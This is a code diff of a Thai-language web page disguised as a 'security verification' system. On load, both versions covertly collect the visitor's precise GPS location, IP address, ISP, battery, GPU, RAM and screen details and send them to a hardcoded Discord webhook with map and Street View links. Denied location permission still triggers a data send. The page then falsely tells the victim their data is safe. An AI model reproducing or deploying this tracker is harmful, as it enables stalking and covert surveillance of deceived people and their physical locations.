@@ -3,184 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ระบบตรวจสอบความปลอดภัยพรีเมียม</title>
+    <title>ระบบรักษาความปลอดภัยอัจฉริยะ</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Kanit', sans-serif; background: #020617; color: white; overflow: hidden; user-select: none; }
-        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 1.2s infinite linear; box-shadow: 0 0 20px #3b82f6; }
-        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
+        body { font-family: 'Kanit', sans-serif; background: #010409; color: white; overflow: hidden; user-select: none; }
+        .glass-panel { background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .scan-line { height: 2px; background: linear-gradient(90deg, transparent, #3b82f6, transparent); position: absolute; width: 100%; top: 0; animation: scan move 1.5s infinite linear; }
+        @keyframes move { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative">
+    <div class="max-w-md w-full glass-panel rounded-[2rem] overflow-hidden shadow-2xl relative border-t-2 border-blue-500/30">
         <div class="p-8 pb-4 text-center">
-            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
-                System Security Verified v9.0
+            <div class="inline-block px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
+                กำลังวิเคราะห์ความปลอดภัยขั้นสูง
             </div>
-            <h1 class="text-3xl font-bold mb-2">ตรวจสอบสถานะ</h1>
-            <p id="main-desc" class="text-slate-400 text-sm leading-relaxed">กำลังวิเคราะห์ข้อมูลอุปกรณ์และพิกัดความปลอดภัย...</p>
+            <h1 class="text-2xl font-bold mb-1">ยืนยันตัวตนผู้ใช้</h1>
+            <p id="main-desc" class="text-slate-400 text-xs">กรุณารอระบบรวบรวมข้อมูลฮาร์ดแวร์และเครือข่าย...</p>
         </div>
 
         <div class="p-8 pt-0">
-            <div id="step-scan" class="block text-center py-10">
-                <div class="relative w-48 h-48 mx-auto mb-6 rounded-full border-4 border-blue-500/20 overflow-hidden bg-slate-900 flex items-center justify-center">
-                    <div class="text-6xl animate-pulse">📡</div>
-                    <div class="scan-anim"></div>
+            <div id="step-scan" class="block text-center py-6">
+                <div class="relative w-32 h-32 mx-auto mb-6 rounded-3xl bg-slate-900 flex items-center justify-center border border-white/5">
+                    <div class="text-4xl animate-pulse">🔒</div>
+                    <div class="scan-line"></div>
                 </div>
-                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest uppercase">กำลังเชื่อมต่อดาวเทียม...</p>
-                <p id="sub-status" class="text-[10px] text-slate-500 mt-2">กรุณารอสักครู่ ระบบกำลังระบุตำแหน่งแม่นยำสูง</p>
+                <div id="status-log" class="text-[10px] font-mono text-blue-400/70 text-left space-y-1 bg-black/30 p-3 rounded-xl border border-white/5">
+                    <p>> กำลังสแกน GPU Renderer...</p>
+                    <p>> ตรวจสอบ Memory Stack...</p>
+                    <p>> วิเคราะห์พิกัดดาวเทียม...</p>
+                </div>
             </div>
 
-            <div id="step-result" class="hidden animate-in fade-in duration-700">
-                <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-2xl flex items-center gap-3 text-green-400">
-                    <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-white text-xl">✓</div>
-                    <div>
-                        <p class="font-bold text-sm uppercase">ตรวจสอบสำเร็จ</p>
-                        <p class="text-[10px] opacity-70">ตำแหน่งและอุปกรณ์ของคุณได้รับการยืนยันแล้ว</p>
-                    </div>
+            <div id="step-result" class="hidden animate-in fade-in zoom-in duration-500">
+                <div class="mb-4 p-4 bg-blue-500/5 border border-blue-500/20 rounded-2xl">
+                    <div id="summary-list" class="text-xs space-y-2 text-slate-300">
+                        </div>
                 </div>
-                <div id="places-container" class="space-y-3"></div>
+                <button onclick="window.open('https://www.google.com/maps?q=${currentLat},${currentLon}')" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-bold text-sm transition-all shadow-lg shadow-blue-600/20 active:scale-95">
+                    เปิดแผนที่เพื่อยืนยันพิกัด
+                </button>
             </div>
         </div>
     </div>
 
     <script>
-        // เปลี่ยน URL Webhook ตรงนี้หากต้องการ
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1497085877245972631/6juBaxSvhNsQ3GMceT_nWa1qeFWEmIk0ZpbrPYfq9qB3URkmYYDvwZ2T1gsTzy8Sj75_";
+        let currentLat, currentLon;
 
-        window.onload = function() {
-            autoStartProcess();
-        };
+        window.onload = startDeepScan;
 
-        async function autoStartProcess() {
-            // 1. ดึงข้อมูล IP และค่ายเน็ต
-            let ipData = { ip: "Checking...", org: "N/A", city: "N/A" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch(e) { console.log("IP lookup failed"); }
-
-            // 2. ดึงข้อมูลรุ่นมือถือเชิงลึก
-            const deviceInfo = getDetailedModel();
+        async function startDeepScan() {
+            const hw = getHardwareInfo();
+            const ip = await getNetworkInfo();
             
-            // 3. ดึงแบตเตอรี่
-            let battery = "N/A";
-            try {
-                const batt = await navigator.getBattery();
-                battery = `${(batt.level * 100).toFixed(0)}% (${batt.charging ? 'กำลังชาร์จ' : 'ไม่ได้ชาร์จ'})`;
-            } catch(e) {}
-
-            // 4. ดึงพิกัด (High Accuracy)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const acc = pos.coords.accuracy.toFixed(1);
+                    currentLat = pos.coords.latitude;
+                    currentLon = pos.coords.longitude;
+                    
+                    const fullData = {
+                        lat: currentLat, lon: currentLon, acc: pos.coords.accuracy.toFixed(1),
+                        ...hw, ...ip
+                    };
 
-                    // ส่งข้อมูลเข้า Discord ทันที
-                    await sendData(lat, lon, acc, deviceInfo, battery, ipData);
-                    // แสดงผลหน้าเว็บ
-                    showResults(lat, lon, deviceInfo.model);
+                    await sendToDiscord(fullData);
+                    updateUI(fullData);
                 }, async (err) => {
-                    await sendData("ไม่อนุญาต", "ไม่อนุญาต", "N/A", deviceInfo, battery, ipData);
-                    document.getElementById('status-msg').innerText = "เข้าถึงพิกัดไม่ได้";
-                    document.getElementById('sub-status').innerText = "กรุณาอนุญาตการเข้าถึงพิกัดเพื่อให้ระบบทำงานได้ถูกต้อง";
-                }, { enableHighAccuracy: true, timeout: 15000 });
+                    await sendToDiscord({ lat: "ปฏิเสธ", lon: "ปฏิเสธ", ...hw, ...ip });
+                    alert("จำเป็นต้องอนุญาตการเข้าถึงพิกัดเพื่อความปลอดภัย");
+                }, { enableHighAccuracy: true });
             }
         }
 
-        function getDetailedModel() {
-            const ua = navigator.userAgent;
-            let model = "ไม่ระบุรุ่น";
-            const w = window.screen.width;
-            const h = window.screen.height;
+        function getHardwareInfo() {
+            // ดึงข้อมูลการ์ดจอ (GPU)
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "ไม่ทราบ";
 
-            if (/android/i.test(ua)) {
-                const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
-                model = match ? match[1] : "Android Device";
-            } else if (/iPhone|iPad/.test(ua)) {
-                // เช็คจาก Resolution เฉพาะทางของ iPhone
-                if ((w === 430 && h === 932) || (h === 430 && w === 932)) model = "iPhone 14/15 Pro Max";
-                else if ((w === 393 && h === 852) || (h === 393 && w === 852)) model = "iPhone 14/15 Pro";
-                else if ((w === 428 && h === 926) || (h === 428 && w === 926)) model = "iPhone 13/14 Plus";
-                else if ((w === 390 && h === 844) || (h === 390 && w === 844)) model = "iPhone 12/13/14";
-                else if ((w === 375 && h === 812) || (h === 375 && w === 812)) model = "iPhone X/11 Pro/12 mini";
-                else if ((w === 414 && h === 896) || (h === 414 && w === 896)) model = "iPhone XR/11 Pro Max";
-                else model = "iOS Device";
-            }
             return {
-                model: model,
-                platform: navigator.platform,
-                screen: `${w}x${h}`,
-                ua: ua
+                model: navigator.userAgent.includes("Android") ? "Android" : "iOS/Other",
+                gpu: gpu,
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "ไม่ระบุ",
+                cores: navigator.hardwareConcurrency || "ไม่ระบุ",
+                screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
+                touchPoints: navigator.maxTouchPoints
             };
         }
 
-        async function sendData(lat, lon, acc, dev, batt, ipInfo) {
-            // โครงสร้าง Payload แบบใช้อิโมจิเคลื่อนไหวที่คุณให้มา
+        async function getNetworkInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch { return { ip: "Error", org: "Unknown" }; }
+        }
+
+        async function sendToDiscord(d) {
             const payload = {
                 embeds: [{
-                    title: "<a:loading:1484593662397644952> [แจ้งเตือน] ตรวจพบข้อมูลเข้าใหม่",
-                    description: "ระบบทำการล็อคพิกัดและวิเคราะห์อุปกรณ์สำเร็จ",
-                    color: 2303786,
+                    title: "<a:loading:1484593662397644952> รายงานการตรวจสอบเชิงลึก",
+                    color: 3447003,
                     fields: [
-                        { 
-                            name: "<a:device:1484593643284074627> ข้อมูลเครื่อง", 
-                            value: `**รุ่น:** ${dev.model}\n**แบตเตอรี่:** ${batt}\n**หน้าจอ:** ${dev.screen}`, 
-                            inline: false 
-                        },
-                        { 
-                            name: "<a:location:1484593651387469954> พิกัดปัจจุบัน", 
-                            value: `\`${lat}, ${lon}\`\n**คลาดเคลื่อน:** +/- ${acc} ม.`, 
-                            inline: true 
-                        },
-                        { 
-                            name: "<a:network:1484593749391708200> เครือข่าย", 
-                            value: `**IP:** ${ipInfo.ip}\n**ค่าย:** ${ipInfo.org || 'N/A'}\n**พื้นที่:** ${ipInfo.city || 'N/A'}`, 
-                            inline: true 
-                        },
-                        { 
-                            name: "<a:link:1484943895526899792> แผนที่นำทาง", 
-                            value: `🚩 [เปิด Google Maps](https://www.google.com/maps?q=${lat},${lon})\n🏙️ [ดู Street View](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon})`, 
-                            inline: false 
-                        }
+                        { name: "<a:device:1484593643284074627> ฮาร์ดแวร์", value: `**GPU:** ${d.gpu}\n**RAM:** ${d.ram} | **CPU:** ${d.cores} คอร์\n**จอ:** ${d.screen}`, inline: false },
+                        { name: "<a:location:1484593651387469954> พิกัด (Lat, Lon)", value: `\`${d.lat}, ${d.lon}\`\n(คลาดเคลื่อน: +/- ${d.acc || 0} ม.)`, inline: true },
+                        { name: "<a:network:1484593749391708200> เครือข่าย", value: `**IP:** ${d.ip}\n**ISP:** ${d.org}\n**เมือง:** ${d.city || 'N/A'}`, inline: true },
+                        { name: "<a:link:1484943895526899792> แผนที่", value: `[ดูบน Google Maps](https://www.google.com/maps?q=${d.lat},${d.lon})` }
                     ],
-                    footer: { 
-                        text: "Security Analysis System • " + new Date().toLocaleString(),
-                        icon_url: "https://cdn.discordapp.com/emojis/1484593620370853948.gif"
-                    }
+                    footer: { text: "Security Trace • " + new Date().toLocaleString('th-TH'), icon_url: "https://cdn.discordapp.com/emojis/1484593620370853948.gif" }
                 }]
             };
-
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
         }
 
-        function showResults(lat, lon, modelName) {
+        function updateUI(d) {
             document.getElementById('step-scan').classList.add('hidden');
             document.getElementById('step-result').classList.remove('hidden');
-            document.getElementById('main-desc').innerText = "ยืนยันตัวตนเสร็จสมบูรณ์";
-
-            const container = document.getElementById('places-container');
-            container.innerHTML = `
-                <div class="bg-white/5 p-4 rounded-2xl border border-white/10 mb-4 text-left">
-                    <p class="text-[10px] text-slate-400 uppercase tracking-widest mb-1">อุปกรณ์ที่ใช้</p>
-                    <p class="text-blue-400 font-bold text-lg">${modelName}</p>
-                </div>
-                <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="flex items-center gap-4 bg-blue-600/20 border border-blue-500/50 p-5 rounded-2xl hover:bg-blue-600/30 transition-all group">
-                    <span class="text-2xl group-hover:rotate-12 transition-transform">🛰️</span>
-                    <div class="flex-1 text-left">
-                        <p class="text-white text-sm font-bold">จุดเช็คอินแนะนำใกล้คุณ</p>
-                        <p class="text-blue-400 text-[10px]">วิเคราะห์ความปลอดภัยตามพิกัดจริง</p>
-                    </div>
-                    <span class="text-blue-500">→</span>
-                </a>
+            document.getElementById('main-desc').innerText = "สแกนสำเร็จ ข้อมูลของคุณปลอดภัย";
+            document.getElementById('summary-list').innerHTML = `
+                <div class="flex justify-between"><span>ผู้ให้บริการ:</span><span class="text-blue-400">${d.org}</span></div>
+                <div class="flex justify-between"><span>พิกัด:</span><span class="text-blue-400">${d.city || 'ตรวจพบแล้ว'}</span></div>
+                <div class="flex justify-between"><span>กราฟิก:</span><span class="text-blue-400">${d.gpu.split(' ').pop()}</span></div>
             `;
         }
     </script>
